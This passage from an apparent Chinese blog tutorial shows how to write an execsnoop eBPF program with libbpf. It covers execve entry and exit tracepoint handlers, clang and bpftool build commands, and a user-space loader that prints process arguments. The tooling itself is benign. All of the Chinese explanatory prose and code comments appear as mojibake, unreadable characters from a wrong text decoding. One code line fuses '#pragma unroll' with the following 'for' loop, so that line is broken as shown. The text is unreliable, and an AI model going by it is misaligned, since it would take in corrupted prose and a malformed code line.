id="å…¥å£è·Ÿè¸ªç‚¹å¤„ç†-1"><a href="#å…¥å£è·Ÿè¸ªç‚¹å¤„ç†-1" class="headerlink" title="å…¥å£è·Ÿè¸ªç‚¹å¤„ç†"></a>å…¥å£è·Ÿè¸ªç‚¹å¤„ç†</h3><p>å¯¹äºå…¥å£è·Ÿè¸ªç‚¹ <code>sys_enter_execve</code> çš„å¤„ç†ï¼Œè¿˜æ˜¯æŒ‰ç…§ä¸Šè¿° BCC ç¨‹åºçš„é€»è¾‘ï¼Œå…ˆè·å–è¿›ç¨‹çš„ PIDã€è¿›ç¨‹åç§°å’Œå‚æ•°åˆ—è¡¨ä¹‹åï¼Œå†å­˜å…¥åˆšåˆšå®šä¹‰çš„å“ˆå¸Œæ˜ å°„ä¸­ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œå…·ä½“æ¯ä¸€æ­¥çš„å†…å®¹æˆ‘éƒ½åŠ äº†è¯¦ç»†çš„æ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_enter_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_enter</span></span><br><span class="line"><span class="params">                       *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **args = (<span class="type">const</span> <span class="type">char</span> **)(ctx-&gt;args[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *argp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥è¯¢PID</span></span><br><span class="line">    u64 id = bpf_get_current_pid_tgid();</span><br><span class="line">    <span class="type">pid_t</span> pid = (<span class="type">pid_t</span>) id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜ä¸€ä¸ªç©ºçš„eventåˆ°å“ˆå¸Œæ˜ å°„ä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(&amp;execs, &amp;pid, &amp;empty_event, BPF_NOEXIST)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event = bpf_map_lookup_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (!event) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–eventå˜é‡</span></span><br><span class="line">    event-&gt;pid = pid;</span><br><span class="line">    event-&gt;args_count = <span class="number">0</span>;</span><br><span class="line">    event-&gt;args_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥è¯¢ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret = bpf_probe_read_user_str(event-&gt;args, ARGSIZE,</span><br><span class="line">                           (<span class="type">const</span> <span class="type">char</span> *)ctx-&gt;args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt;= ARGSIZE) &#123;</span><br><span class="line">        event-&gt;args_size += ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥è¯¢å…¶ä»–å‚æ•°</span></span><br><span class="line">    event-&gt;args_count++;</span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> unrollfor (int i = 1; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span></span><br><span class="line">        bpf_probe_read_user(&amp;argp, <span class="keyword">sizeof</span>(argp), &amp;args[i]);</span><br><span class="line">        <span class="keyword">if</span> (!argp)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (event-&gt;args_size &gt; LAST_ARG)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ret =</span><br><span class="line">            bpf_probe_read_user_str(&amp;event-&gt;args[event-&gt;args_size],</span><br><span class="line">                        ARGSIZE, argp);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; ARGSIZE)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        event-&gt;args_count++;</span><br><span class="line">        event-&gt;args_size += ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†å°è¯•ä¸€æ¬¡ï¼Œç¡®è®¤æ˜¯å¦è¿˜æœ‰æœªè¯»å–çš„å‚æ•°</span></span><br><span class="line">    bpf_probe_read_user(&amp;argp, <span class="keyword">sizeof</span>(argp), &amp;args[TOTAL_MAX_ARGS]);</span><br><span class="line">    <span class="keyword">if</span> (!argp)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœè¿˜æœ‰æœªè¯»å–å‚æ•°ï¼Œåˆ™å¢åŠ å‚æ•°æ•°é‡ï¼ˆç”¨äºè¾“å‡º&quot;...&quot;ï¼‰</span></span><br><span class="line">    event-&gt;args_count++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œä½ éœ€è¦æ³¨æ„è¿™ä¸‰ç‚¹ï¼š</p><ul><li>ç¬¬ä¸€ï¼Œç¨‹åºä½¿ç”¨äº† <code>bpf_probe_read_user()</code>Â  æ¥æŸ¥è¯¢å‚æ•°ã€‚ç”±äºå®ƒæŠŠ <code>\0</code>Â  ä¹Ÿç®—åˆ°äº†å·²è¯»å–å‚æ•°çš„é•¿åº¦é‡Œé¢ï¼Œæ‰€ä»¥æœ€ç»ˆ <code>event-&gt;args</code> ä¸­ä¿å­˜çš„å„ä¸ªå‚æ•°æ˜¯ä»¥ <code>\0</code>Â  åˆ†éš”çš„ã€‚åœ¨ç”¨æˆ·æ€ç¨‹åºè¾“å‡ºå‚æ•°ä¹‹å‰ï¼Œéœ€è¦ç”¨ç©ºæ ¼æ›¿æ¢ Â <code>\0</code>ã€‚</li><li>ç¬¬äºŒï¼Œç¨‹åºåœ¨ä¸€å¼€å§‹çš„æ—¶å€™å‘å“ˆå¸Œæ˜ å°„å­˜å…¥äº†ä¸€ä¸ªç©ºäº‹ä»¶ï¼Œåœ¨åç»­å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†çš„æ—¶å€™éœ€è¦ç¡®ä¿ç©ºäº‹ä»¶ä¹Ÿèƒ½æ­£ç¡®æ¸…ç†ã€‚</li><li>ç¬¬ä¸‰ï¼Œç¨‹åºåœ¨æœ€ååˆå°è¯•å¤šè¯»å–äº†ä¸€æ¬¡å‚æ•°åˆ—è¡¨ã€‚å¦‚æœè¿˜æœ‰æœªè¯»å–å‚æ•°ï¼Œå‚æ•°æ•°é‡å¢åŠ äº† 1ã€‚ç”¨æˆ·æ€ç¨‹åºå¯ä»¥æ ¹æ®å‚æ•°æ•°é‡æ¥å†³å®šæ˜¯ä¸æ˜¯éœ€è¦åœ¨å‚æ•°ç»“å°¾è¾“å‡ºä¸€ä¸ªÂ <code>...</code>ã€‚</li></ul><h3 id="å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†-1"><a href="#å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†-1" class="headerlink" title="å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†"></a>å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†</h3><p>å…¥å£è·Ÿè¸ªç‚¹å¤„ç†å¥½ä¹‹åï¼Œå†æ¥çœ‹çœ‹å‡ºå£è·Ÿè¸ªç‚¹çš„å¤„ç†æ–¹æ³•ã€‚å®ƒçš„æ­¥éª¤è·Ÿ BCC ç¨‹åºä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¹Ÿæ˜¯æŸ¥è¯¢è¿›ç¨‹åŸºæœ¬ä¿¡æ¯ã€å¡«å……è¿”å›å€¼ã€æäº¤åˆ°æ€§èƒ½äº‹ä»¶æ˜ å°„è¿™ä¸‰ä¸ªæ­¥éª¤ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºåˆšæ‰å…¥å£è·Ÿè¸ªç‚¹çš„å¤„ç†ä¸­æ²¡æœ‰è¯»å–è¿›ç¨‹åç§°ï¼Œæ‰€ä»¥åœ¨æäº¤æ€§èƒ½äº‹ä»¶ä¹‹å‰è¿˜éœ€è¦å…ˆæŸ¥è¯¢ä¸€ä¸‹è¿›ç¨‹åç§°ã€‚å®Œæ•´çš„ç¨‹åºå¦‚ä¸‹æ‰€ç¤ºï¼Œå…·ä½“æ¯ä¸€æ­¥çš„å†…å®¹æˆ‘ä¹ŸåŠ äº†è¯¦ç»†çš„æ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_exit_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_exit_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_exit *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    u64 id;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»å“ˆå¸Œæ˜ å°„ä¸­æŸ¥è¯¢è¿›ç¨‹åŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">    id = bpf_get_current_pid_tgid();</span><br><span class="line">    pid = (<span class="type">pid_t</span>) id;</span><br><span class="line">    event = bpf_map_lookup_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (!event)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ›´æ–°è¿”å›å€¼å’Œè¿›ç¨‹åç§°</span></span><br><span class="line">    ret = ctx-&gt;ret;</span><br><span class="line">    event-&gt;retval = ret;</span><br><span class="line">    bpf_get_current_comm(&amp;event-&gt;comm, <span class="keyword">sizeof</span>(event-&gt;comm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æäº¤æ€§èƒ½äº‹ä»¶</span></span><br><span class="line">    <span class="type">size_t</span> len = EVENT_SIZE(event);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="keyword">sizeof</span>(*event))</span><br><span class="line">        bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, event,</span><br><span class="line">                      len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…ç†å“ˆå¸Œæ˜ å°„</span></span><br><span class="line">    bpf_map_delete_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»è¿™äº›ä»£ç ä¸­ä½ å¯ä»¥çœ‹åˆ°ï¼Œå®ƒçš„å¤„ç†é€»è¾‘è·Ÿä¸Šè¿°çš„ BCC ç¨‹åºåŸºæœ¬ä¸Šæ˜¯ç›¸åŒçš„ã€‚ä¸è¿‡ï¼Œè¯¦ç»†å¯¹æ¯”ä¸€ä¸‹ï¼Œä½ ä¼šå‘ç°å®ƒä»¬ä¹‹é—´è¿˜æ˜¯æœ‰ä¸åŒçš„ï¼Œä¸åŒç‚¹ä¸»è¦åœ¨ä¸¤ä¸ªæ–¹é¢ï¼š</p><ul><li>ç¬¬ä¸€ï¼Œå‡½æ•°åçš„å®šä¹‰æ ¼å¼ä¸åŒã€‚BCC ç¨‹åºä½¿ç”¨çš„æ˜¯ <code>TRACEPOINT_PROBE</code> å®ï¼Œè€Œ libbpf ç¨‹åºç”¨çš„åˆ™æ˜¯ Â <code>SEC</code>Â  å®ã€‚</li><li>ç¬¬äºŒï¼Œæ˜ å°„çš„è®¿é—®æ–¹æ³•ä¸åŒã€‚BCC å°è£…äº†å¾ˆå¤šæ›´æ˜“ç”¨çš„æ˜ å°„è®¿é—®å‡½æ•°ï¼ˆå¦‚ <code>tasks.lookup()</code>ï¼‰ï¼Œè€Œ libbpf ç¨‹åºåˆ™éœ€è¦è°ƒç”¨ 05 è®² æåˆ°è¿‡çš„ BPF è¾…åŠ©å‡½æ•°ï¼ˆæ¯”å¦‚æŸ¥è¯¢è¦ä½¿ç”¨ <code>bpf_map_lookup_elem()</code>ï¼‰ã€‚</li></ul><p>åˆ°è¿™é‡Œï¼Œæ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå¹¶æŠŠä¸Šè¿°ä»£ç å­˜å…¥ <code>execsnoop.bpf.c</code> æ–‡ä»¶ä¸­ï¼ŒeBPF éƒ¨åˆ†çš„ä»£ç ä¹Ÿå°±å¼€å‘å¥½äº†ã€‚</p><h3 id="ç¼–è¯‘å¹¶ç”Ÿæˆè„šæ‰‹æ¶å¤´æ–‡ä»¶"><a href="#ç¼–è¯‘å¹¶ç”Ÿæˆè„šæ‰‹æ¶å¤´æ–‡ä»¶" class="headerlink" title="ç¼–è¯‘å¹¶ç”Ÿæˆè„šæ‰‹æ¶å¤´æ–‡ä»¶"></a>ç¼–è¯‘å¹¶ç”Ÿæˆè„šæ‰‹æ¶å¤´æ–‡ä»¶</h3><p>æœ‰äº† eBPF ç¨‹åºï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ clang å’Œ bpftool å°†å…¶ç¼–è¯‘æˆ BPF å­—èŠ‚ç ï¼Œç„¶åå†ç”Ÿæˆå…¶è„šæ‰‹æ¶å¤´æ–‡ä»¶ Â <code>execsnoop.skel.h</code>Â ï¼ˆæ³¨æ„ï¼Œè„šæ‰‹æ¶å¤´æ–‡ä»¶çš„åå­—ä¸€èˆ¬å®šä¹‰ä¸º Â <code>&lt;ç¨‹åºå&gt;.skel.h</code>ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/include/x86_64-linux-gnu -I. -c execsnoop.bpf.c -o execsnoop.bpf.o</span><br><span class="line">bpftool gen skeleton execsnoop.bpf.o &gt; execsnoop.skel.h</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œclang çš„å‚æ•° <code>-target bpf</code>Â  è¡¨ç¤ºè¦ç”Ÿæˆ BPF å­—èŠ‚ç ï¼Œ<code>-D__TARGET_ARCH_x86_64</code>Â  è¡¨ç¤ºç›®æ ‡çš„ä½“ç³»ç»“æ„æ˜¯ <code>x86_64</code>ï¼Œè€Œ Â <code>-I</code>Â  åˆ™æ˜¯å¼•å…¥å¤´æ–‡ä»¶è·¯å¾„ã€‚</p><p>å‘½ä»¤æ‰§è¡Œåï¼Œè„šæ‰‹æ¶å¤´æ–‡ä»¶ä¼šæ”¾åˆ° <code>execsnoop.skel.h</code>Â  ä¸­ï¼Œè¿™ä¸ªå¤´æ–‡ä»¶åŒ…å«äº† BPF å­—èŠ‚ç å’Œç›¸å…³çš„ç®¡ç†å‡½æ•°ã€‚å› è€Œï¼Œå½“ç”¨æˆ·æ€ç¨‹åºå¼•å…¥è¿™ä¸ªå¤´æ–‡ä»¶å¹¶ç¼–è¯‘ä¹‹åï¼Œåªéœ€è¦åˆ†å‘æœ€ç»ˆç”¨æˆ·æ€ç¨‹åºç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ°ç”Ÿäº§ç¯å¢ƒå³å¯ï¼ˆå¦‚æœç”¨æˆ·æ€ç¨‹åºä½¿ç”¨äº†å…¶ä»–çš„åŠ¨æ€åº“ï¼Œè¿˜éœ€è¦åˆ†å‘åŠ¨æ€åº“ï¼‰ã€‚</p><h3 id="å¼€å‘ç”¨æˆ·æ€ç¨‹åº"><a href="#å¼€å‘ç”¨æˆ·æ€ç¨‹åº" class="headerlink" title="å¼€å‘ç”¨æˆ·æ€ç¨‹åº"></a>å¼€å‘ç”¨æˆ·æ€ç¨‹åº</h3><p>æœ‰äº†è„šæ‰‹æ¶å¤´æ–‡ä»¶ä¹‹åï¼Œè¿˜å‰©ä¸‹æœ€åä¸€æ­¥ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·æ€ç¨‹åºçš„å¼€å‘ã€‚</p><p>åŒ BCC çš„ Python å‰ç«¯ç¨‹åºç±»ä¼¼ï¼Œlibbpf ç”¨æˆ·æ€ç¨‹åºä¹Ÿéœ€è¦ eBPF ç¨‹åºåŠ è½½ã€æŒ‚è½½åˆ°è·Ÿè¸ªç‚¹ï¼Œä»¥åŠé€šè¿‡ BPF æ˜ å°„è·å–å’Œæ‰“å°æ‰§è¡Œç»“æœç­‰å‡ ä¸ªæ­¥éª¤ã€‚è™½ç„¶ C è¯­è¨€å¬èµ·æ¥å¯èƒ½æ¯” Python è¯­è¨€éº»çƒ¦ä¸€äº›ï¼Œä½†å®é™…ä¸Šï¼Œè¿™å‡ ä¸ªæ­¥éª¤éƒ½å¯ä»¥é€šè¿‡è„šæ‰‹æ¶å¤´æ–‡ä»¶ä¸­è‡ªåŠ¨ç”Ÿæˆçš„å‡½æ•°æ¥å®Œæˆã€‚</p><p>ä¸‹é¢æ˜¯å¿½ç•¥äº†é”™è¯¯å¤„ç†é€»è¾‘ä¹‹åï¼Œç”¨æˆ·æ€ç¨‹åºçš„ä¸€ä¸ªåŸºæœ¬æ¡†æ¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼•å…¥è„šæ‰‹æ¶å¤´æ–‡ä»¶</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;execsnoop.skel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Cè¯­è¨€ä¸»å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰BPFç¨‹åºå’Œæ€§èƒ½äº‹ä»¶ç¼“å†²åŒº</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">execsnoop_bpf</span> *<span class="title">skel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">perf_buffer_opts</span> <span class="title">pb_opts</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">perf_buffer</span> *<span class="title">pb</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è®¾ç½®è°ƒè¯•è¾“å‡ºå‡½æ•°</span></span><br><span class="line">    libbpf_set_print(libbpf_print_fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å¢å¤§ RLIMIT_MEMLOCKï¼ˆé»˜è®¤å€¼é€šå¸¸å¤ªå°ï¼Œä¸è¶³ä»¥å­˜å…¥BPFæ˜ å°„çš„å†…å®¹ï¼‰</span></span><br><span class="line">    bump_memlock_rlimit();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. åˆå§‹åŒ–BPFç¨‹åº</span></span><br><span class="line">    skel = execsnoop_bpf__open();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. åŠ è½½BPFå­—èŠ‚ç </span></span><br><span class="line">    err = execsnoop_bpf__load(skel);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. æŒ‚è½½BPFå­—èŠ‚ç åˆ°è·Ÿè¸ªç‚¹</span></span><br><span class="line">    err = execsnoop_bpf__attach(skel);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. é…ç½®æ€§èƒ½äº‹ä»¶å›è°ƒå‡½æ•°</span></span><br><span class="line">    pb_opts.sample_cb = handle_event;</span><br><span class="line">    pb = perf_buffer__new(bpf_map__fd(skel-&gt;maps.events), <span class="number">64</span>, &amp;pb_opts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. ä»ç¼“å†²åŒºä¸­å¾ªç¯è¯»å–æ•°æ®</span></span><br><span class="line">    <span class="keyword">while</span> ((err = perf_buffer__poll(pb, <span class="number">100</span>)) &gt;= <span class="number">0</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>execsnoop_</code>Â  å¼€å¤´çš„æ•°æ®ç»“æ„å’Œå‡½æ•°éƒ½åŒ…å«åœ¨è„šæ‰‹æ¶å¤´æ–‡ä»¶ <code>execsnoop.skel.h</code> ä¸­ã€‚è€Œå…·ä½“åˆ°æ¯ä¸€æ­¥çš„å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li>ç¬¬ 1 æ­¥çš„è°ƒè¯•è¾“å‡ºå‡½æ•°ä¸­ï¼Œå¯ä»¥è°ƒç”¨ <code>printf()</code> æŠŠè°ƒè¯•ä¿¡æ¯è¾“å‡ºåˆ°ç»ˆç«¯ä¸­ã€‚</li><li>ç¬¬ 2 æ­¥å¢å¤§é”å®šå†…å­˜é™åˆ¶ <code>RLIMIT_MEMLOCK</code> æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºç³»ç»Ÿé»˜è®¤çš„é”å®šå†…å­˜é€šå¸¸è¿‡å°ï¼Œæ— æ³•æ»¡è¶³ BPF æ˜ å°„çš„éœ€è¦ã€‚</li><li>ç¬¬ 3~5 æ­¥ï¼Œç›´æ¥è°ƒç”¨è„šæ‰‹æ¶å¤´æ–‡ä»¶ä¸­çš„å‡½æ•°ï¼ŒåŠ è½½ BPF å­—èŠ‚ç å¹¶æŒ‚è½½åˆ°è·Ÿè¸ªç‚¹ã€‚</li><li>ç¬¬ 6~7 æ­¥ä¸ºæ€§èƒ½äº‹ä»¶è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¹¶ä»ç¼“å†²åŒºä¸­å¾ªç¯è¯»å–æ•°æ®ã€‚æ³¨æ„ï¼Œæ€§èƒ½äº‹ä»¶æ˜ å°„ Â <code>skel-&gt;maps.events</code>Â  ä¹Ÿæ˜¯ bpftool è‡ªåŠ¨å¸®ä½ ç”Ÿæˆå¥½çš„ã€‚</li></ul><p>æ¥ä¸‹æ¥ï¼Œåœ¨æ€§èƒ½äº‹ä»¶å›è°ƒå‡½æ•°ä¸­ï¼ŒæŠŠæ•°æ®æ ¼å¼è½¬æ¢ä¸º <code>struct event</code>Â  æ ¼å¼ä¹‹åï¼Œç”±äºå‚æ•°åˆ—è¡¨æ˜¯ä½¿ç”¨ Â <code>\0</code>Â  æ¥åˆ†å‰²çš„ï¼Œå¹¶ä¸èƒ½ç›´æ¥å‘ç»ˆç«¯æ‰“å°æ‰€æœ‰å‚æ•°ã€‚æ‰€ä»¥ï¼Œè¿˜éœ€è¦æŠŠ Â <code>\0</code>Â  å…ˆæ›¿æ¢ä¸ºç©ºæ ¼ï¼Œç„¶åå†æ‰“å°ã€‚å®Œæ•´çš„å›è°ƒå‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ€§èƒ½äº‹ä»¶å›è°ƒå‡½æ•°(å‘ç»ˆç«¯ä¸­æ‰“å°è¿›ç¨‹åã€PIDã€è¿”å›å€¼ä»¥åŠå‚æ•°)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_event</span><span class="params">(<span class="type">void</span> *ctx, <span class="type">int</span> cpu, <span class="type">void</span> *data, __u32 data_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">e</span> =</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-16s %-6d %3d &quot;</span>, e-&gt;comm, e-&gt;pid, e-&gt;retval);</span><br><span class="line">    print_args(e);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å°å‚æ•°ï¼ˆæ›¿æ¢&#x27;\0&#x27;ä¸ºç©ºæ ¼ï¼‰</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">print_args</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> event *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> args_counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e-&gt;args_size &amp;&amp; args_counter &lt; e-&gt;args_count; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c = e-&gt;args[i];</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// æŠŠ&#x27;\0&#x27;æ›¿æ¢ä¸ºç©ºæ ¼</span></span><br><span class="line">            args_counter++;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;args_count &gt; TOTAL_MAX_ARGS) &#123;</span><br><span class="line">        <span class="comment">// è¿‡é•¿çš„å‚æ•°è¾“å‡º&quot;...&quot;æ›¿ä»£</span></span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot; ...&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span 